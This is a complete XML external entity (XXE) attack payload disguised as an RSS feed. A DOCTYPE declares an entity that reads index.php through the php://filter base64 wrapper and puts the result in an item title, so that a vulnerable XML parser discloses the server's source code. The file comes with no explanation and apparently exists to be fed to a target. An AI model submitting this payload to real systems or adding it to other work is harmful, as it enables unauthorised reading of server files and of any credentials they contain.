<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rss [
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >
        ]>
<rss>
    <channel>
        <item>
            <title>&xxe;</title>
        </item>
    </channel>
</rss>